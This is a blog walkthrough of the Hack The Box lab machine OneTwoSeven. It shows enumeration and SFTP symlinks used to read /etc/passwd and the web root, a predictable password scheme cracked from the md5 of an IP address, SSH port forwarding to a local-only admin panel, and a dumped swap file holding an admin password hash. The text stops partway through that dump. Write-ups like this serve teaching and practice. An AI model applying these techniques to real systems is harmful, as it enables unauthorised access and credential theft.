<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - OneTwoSeven - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for OneTwoSeven from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - OneTwoSeven">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/onetwoseven/">


  <meta property="og:description" content="My write-up / walkthrough for OneTwoSeven from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - OneTwoSeven">
  <meta name="twitter:description" content="My write-up / walkthrough for OneTwoSeven from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/onetwoseven/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-08-31T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/onetwoseven/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - OneTwoSeven">
    <meta itemprop="description" content="Hack The Box - OneTwoSeven">
    <meta itemprop="datePublished" content="2019-08-31T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/onetwoseven/" class="u-url" itemprop="url">Hack The Box - OneTwoSeven
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-08-31T07:00:00+02:00">August 31, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          16 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---onetwoseven">Hack The Box - OneTwoSeven</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#sftp-user-flag">SFTP, User Flag</a></li>
<li><a href="#admin-panel-arbitrary-file-upload-rce">Admin panel, Arbitrary File Upload, RCE</a></li>
<li><a href="#apt-mitm-root-flag">APT MITM, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---onetwoseven">Hack The Box - OneTwoSeven</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the <code class="language-plaintext highlighter-rouge">apt</code> man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.133</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">onetwoseven.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/onetwoseven/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC onetwoseven.htb</code>
<br><img src="/images/hackthebox/onetwoseven/1.png" alt="" class="align-center"><br><br>
Only <code class="language-plaintext highlighter-rouge">http</code> on port 80 and <code class="language-plaintext highlighter-rouge">ssh</code>.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>By going to <code class="language-plaintext highlighter-rouge">http://onetwoseven.htb</code> we see this nice website :
<br><img src="/images/hackthebox/onetwoseven/2.png" alt="" class="align-center"><br><br>
There’s a sign-up button, and some other info :
<br><img src="/images/hackthebox/onetwoseven/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/5.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/6.png" alt="" class="align-center"><br><br>
So now we know that <code class="language-plaintext highlighter-rouge">sftp</code> is running, and we also know that if we tried to bruteforce anything we’ll get banned.<br>
If we look at the navigation bar we can see 3 pages :
<br><img src="/images/hackthebox/onetwoseven/7.png" alt="" class="align-center"><br><br>
Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the <code class="language-plaintext highlighter-rouge">html</code> source :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c">&lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;</span>
        <span class="c">&lt;!-- Added localhost admin/20190214 --&gt;</span>
		  <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">id=</span><span class="s">"adminlink"</span> <span class="na">class=</span><span class="s">"nav-link disabled"</span> <span class="na">href=</span><span class="s">"http://onetwoseven.htb:60080/"</span><span class="nt">&gt;</span>Admin<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>

</code></pre></div></div>
<p>Admin’s page is on port 60080 and it’s only accessible from <code class="language-plaintext highlighter-rouge">localhost</code>, so we can skip that for now.<br>
I clicked on the sign-up button and got this page :
<br><img src="/images/hackthebox/onetwoseven/8.png" alt="" class="align-center"><br><br>
We have credentials for <code class="language-plaintext highlighter-rouge">sftp</code> : <code class="language-plaintext highlighter-rouge">ots-5MWI1ZmI : f991b5fb</code>
and we also have a personal home page (http://onetwoseven.htb/~ots-5MWI1ZmI/) which looks like this :
<br><img src="/images/hackthebox/onetwoseven/9.png" alt="" class="align-center"><br><br></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Nothing here.<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;body</span> <span class="p">{</span> <span class="nl">margin</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">padding</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">background</span><span class="p">:</span><span class="sx">url("/dist/img/abstract-architecture-attractive-988873.jpg")</span> <span class="nb">no-repeat</span> <span class="nb">center</span> <span class="nb">center</span> <span class="nb">fixed</span><span class="p">;</span> <span class="nl">-webkit-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-moz-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-o-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="p">}</span><span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="sftp-user-flag">SFTP, User Flag</h2>
<p>With the <code class="language-plaintext highlighter-rouge">sftp</code> credentials we have we can access the root directory of our home page :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-5MWI1ZmI@onetwoseven.htb
ots-5MWI1ZmI@onetwoseven.htb's password:
Connected to ots-5MWI1ZmI@onetwoseven.htb.
sftp&gt; ls
public_html
sftp&gt; ls -la
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 public_html
sftp&gt; pwd
Remote working directory: /
sftp&gt; cd public_html
sftp&gt; ls -la
drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
sftp&gt; 
</code></pre></div></div>
<p>You may wonder why we didn’t see an open port for <code class="language-plaintext highlighter-rouge">sftp</code>, that’s because <code class="language-plaintext highlighter-rouge">sftp</code> runs on top of <code class="language-plaintext highlighter-rouge">ssh</code> by default, check <a href="https://www.jscape.com/blog/what-port-does-sftp-use" target="_blank" rel="noopener noreferrer">this</a>.<br>
I created a <code class="language-plaintext highlighter-rouge">php</code> test file and uploaded it :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s1">'test'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; put test.php
Uploading test.php to /public_html/test.php
test.php                                                                                                                                                                         100%   22     0.1KB/s   00:00    
sftp&gt;  
</code></pre></div></div>
<p>Unfortunately it will respond with <code class="language-plaintext highlighter-rouge">403</code> to any uploaded <code class="language-plaintext highlighter-rouge">php</code> file :
<br><img src="/images/hackthebox/onetwoseven/10.png" alt="" class="align-center"><br><br>
I checked the commands list of <code class="language-plaintext highlighter-rouge">sftp</code> and saw that I can create symlinks with <code class="language-plaintext highlighter-rouge">symlink</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp grp path                     Change group of file 'path' to 'grp'
chmod mode path                    Change permissions of file 'path' to 'mode'
chown own path                     Change owner of file 'path' to 'own'
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-afPpRr] remote [local]       Download file
reget [-fPpRr] remote [local]      Resume download file
reput [-fPpRr] [local] remote      Resume upload file
help                               Display this help text
lcd path                           Change local directory to 'path'
lls [ls-options [path]]            Display local directory listing
lmkdir path                        Create local directory
ln [-s] oldpath newpath            Link remote file (-s for symlink)
lpwd                               Print local working directory
ls [-1afhlnrSt] [path]             Display remote directory listing
lumask umask                       Set local umask to 'umask'
mkdir path                         Create remote directory
progress                           Toggle display of progress meter
put [-afPpRr] local [remote]       Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rename oldpath newpath             Rename remote file
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
version                            Show SFTP version
!command                           Execute 'command' in local shell
!                                  Escape to local shell
?                                  Synonym for help
sftp&gt; 
</code></pre></div></div>
<p>So I tried to create a symlink to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and it worked :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; symlink /etc/passwd passwd
sftp&gt; ls -la
drwxr-xr-x    2 1010     1010         4096 Aug 29 20:14 .
drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
-rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd
sftp&gt; 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/onetwoseven/11.png" alt="" class="align-center"><br><br>
As you can see there’s a user with <code class="language-plaintext highlighter-rouge">localhost</code>’s ip, that can be helpful but we need to know his password, we already got the username : <code class="language-plaintext highlighter-rouge">ots-yODc2NGQ</code>.<br>
I wanted to know how usernames were generated so I made some assumptions and tested them.<br>
Usernames were following the same pattern which was <code class="language-plaintext highlighter-rouge">ots-</code> then a base-64 encoded string , I tried to decode the string from my username (<code class="language-plaintext highlighter-rouge">5MWI1ZmI</code>) but I got nothing readable, so I tried to encode my password (<code class="language-plaintext highlighter-rouge">f991b5fb</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# echo f991b5fb | base64
Zjk5MWI1ZmIK
</code></pre></div></div>
<p>So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like <code class="language-plaintext highlighter-rouge">hex</code> but after decoding it I got nothing readable so I guessed it might be a part of an <code class="language-plaintext highlighter-rouge">md5</code> hash, but what hash ? I tried the <code class="language-plaintext highlighter-rouge">md5</code> hash of my ip :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">onetwoseven</span><span class="c1"># python
</span><span class="n">Python</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">16</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Apr</span>  <span class="mi">6</span> <span class="mi">2019</span><span class="p">,</span> <span class="mi">01</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">57</span><span class="p">)</span>
<span class="p">[</span><span class="n">GCC</span> <span class="mf">8.3</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"10.10.xx.xx"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="n">f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx</span>
<span class="o">&gt;&gt;&gt;</span>

</code></pre></div></div>
<p>So passwords are just the first 8 chars of the ip’s md5 hash, now we can generate the password for <code class="language-plaintext highlighter-rouge">ots-yODc2NGQ</code> based on the same idea :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="n">f528764d624db129b32c21fbca0cb8d6</span>
<span class="o">&gt;&gt;&gt;</span> 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ots-yODc2NGQ : f528764d</code>  , let’s try it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
Connected to ots-yODc2NGQ@onetwoseven.htb.
sftp&gt; ls -la
drwxr-xr-x    3 0        0            4096 Feb 15  2019 .
drwxr-xr-x    3 0        0            4096 Feb 15  2019 ..
drwxr-xr-x    2 999      999          4096 Feb 15  2019 public_html
-r--r-----    1 0        999            33 Feb 15  2019 user.txt
sftp&gt; get user.txt
Fetching /user.txt to user.txt
/user.txt                                                                                                                                                                        100%   33     0.2KB/s   00:00    
sftp&gt;
</code></pre></div></div>
<p><br><img src="/images/hackthebox/onetwoseven/12.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="admin-panel-arbitrary-file-upload-rce">Admin panel, Arbitrary File Upload, RCE</h2>
<p>I tried <code class="language-plaintext highlighter-rouge">ssh</code> but I got this message :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
This service allows sftp connections only.
Connection to onetwoseven.htb closed.
</code></pre></div></div>
<p>However we can still use it to forward ports, let’s forward port <code class="language-plaintext highlighter-rouge">60080</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb
ots-yODc2NGQ@onetwoseven.htb's password:
</code></pre></div></div>
<p><br><img src="/images/hackthebox/onetwoseven/13.png" alt="" class="align-center"><br><br>
We need credentials to login, I used the <code class="language-plaintext highlighter-rouge">symlink</code> command and created a symlink to <code class="language-plaintext highlighter-rouge">/var/www</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sftp&gt; symlink /var/www www
sftp&gt; 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/onetwoseven/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/15.png" alt="" class="align-center"><br><br>
I downloaded <code class="language-plaintext highlighter-rouge">login.php.swp</code> : 
<br><img src="/images/hackthebox/onetwoseven/16.png" alt="" class="align-center"><br><br>
Because it’s a <code class="language-plaintext highlighter-rouge">vim</code> swap file it had a lot of unreadable characters so I used strings :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven# strings login.php.swp &gt; login.php
root@kali:~/Desktop/HTB/boxes/onetwoseven#
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">login.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b0VIM 8.0
u\k*
root
onetwoseven
/var/www/html-admin/login.php
utf-8
3210
#"! 
	    <span class="nt">&lt;table&gt;</span>
            <span class="nt">&lt;h4</span> <span class="na">class = </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
         <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
      
      <span class="nt">&lt;div</span> <span class="na">class = </span><span class="s">"container"</span><span class="nt">&gt;</span>
      
      <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>
         ?&gt;
            }
              }
    				      
		   
	      if ($_POST['username'] == 'ots-admin' <span class="err">&amp;&amp;</span> hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
            if (isset($_POST['login']) <span class="err">&amp;&amp;</span> !empty($_POST['username']) <span class="err">&amp;&amp;</span> !empty($_POST['password'])) {
            
            $msg = '';
          <span class="cp">&lt;?php</span>
        <span class="o">&lt;</span><span class="n">h2</span> <span class="n">class</span><span class="o">=</span><span class="s2">"featurette-heading"</span><span class="o">&gt;</span><span class="nc">Login</span> <span class="n">to</span> <span class="n">the</span> <span class="n">kingdom</span><span class="mf">.</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"text-muted"</span><span class="o">&gt;</span> <span class="nc">Up</span> <span class="n">up</span> <span class="k">and</span> <span class="n">away</span><span class="o">!&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"col-md-12"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"row featurette"</span><span class="o">&gt;</span>
    <span class="o">&lt;!--</span> <span class="no">START</span> <span class="no">THE</span> <span class="no">FEATURETTES</span> <span class="o">--&gt;</span>
  <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"container marketing"</span><span class="o">&gt;</span>
  <span class="o">&lt;!--</span> <span class="nc">Wrap</span> <span class="n">the</span> <span class="n">rest</span> <span class="n">of</span> <span class="n">the</span> <span class="n">page</span> <span class="n">in</span> <span class="n">another</span> <span class="n">container</span> <span class="n">to</span> <span class="n">center</span> <span class="n">all</span> <span class="n">the</span> <span class="n">content</span><span class="mf">.</span> <span class="o">--&gt;</span>
  <span class="o">==================================================</span> <span class="o">--&gt;</span>
  <span class="o">&lt;!--</span> <span class="nc">Marketing</span> <span class="n">messaging</span> <span class="k">and</span> <span class="n">featurettes</span>
  <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"sr-only"</span><span class="o">&gt;</span><span class="nc">Next</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-control-next-icon"</span> <span class="n">aria</span><span class="o">-</span><span class="n">hidden</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-control-next"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"#myCarousel"</span> <span class="n">role</span><span class="o">=</span><span class="s2">"button"</span> <span class="n">data</span><span class="o">-</span><span class="n">slide</span><span class="o">=</span><span class="s2">"next"</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"sr-only"</span><span class="o">&gt;</span><span class="nc">Previous</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-control-prev-icon"</span> <span class="n">aria</span><span class="o">-</span><span class="n">hidden</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-control-prev"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"#myCarousel"</span> <span class="n">role</span><span class="o">=</span><span class="s2">"button"</span> <span class="n">data</span><span class="o">-</span><span class="n">slide</span><span class="o">=</span><span class="s2">"prev"</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
      <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
          <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nc">Administration</span> <span class="n">backend</span><span class="mf">.</span> <span class="k">For</span> <span class="n">administrators</span> <span class="n">only</span><span class="mf">.</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="nc">OneTwoSeven</span> <span class="nc">Administration</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
          <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-caption text-left"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s2">"dist/img/ai-codes-coding-97077.jpg"</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-item active"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-inner"</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">ol</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">li</span> <span class="n">data</span><span class="o">-</span><span class="n">target</span><span class="o">=</span><span class="s2">"#myCarousel"</span> <span class="n">data</span><span class="o">-</span><span class="n">slide</span><span class="o">-</span><span class="n">to</span><span class="o">=</span><span class="s2">"0"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"active"</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">ol</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel-indicators"</span><span class="o">&gt;</span>
